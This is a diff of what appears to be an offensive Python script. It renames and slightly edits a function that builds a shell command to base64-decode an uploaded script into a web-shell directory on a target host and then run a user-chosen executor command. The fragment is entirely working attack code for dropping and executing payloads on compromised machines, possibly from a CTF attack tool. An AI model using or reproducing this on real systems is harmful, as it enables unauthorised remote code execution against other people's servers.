@@ -162,16 +162,19 @@ def visit_url(target,target_port,url):
 	res.close()
 	return False
 
-def upload_and_execute(target,target_port,cmd):
+def u_e(target,target_port,cmd):
 	global U_A_E_flag, upload_file_name, executor
 	if not U_A_E_flag:
+		# to avoid output mess up
+		time.sleep(1)
 		upload_file_name = raw_input('The file to upload:')
 		executor = raw_input('The executor:')
 		U_A_E_flag = 1
 	contents = open("./script/" + upload_file_name).read()
 	contents = base64.b64encode(contents)
 	cmd = '/bin/echo %s | /usr/bin/base64 -d | /bin/cat > %s/%s'%(contents , shell_absolute_path , upload_file_name)
-	cmd += ';' + executor
+	cmd += ';' + executor 
+	# to delete the file u just upload, you need to del file from the program itself
 	debug_print(cmd)
 	return cmd
 
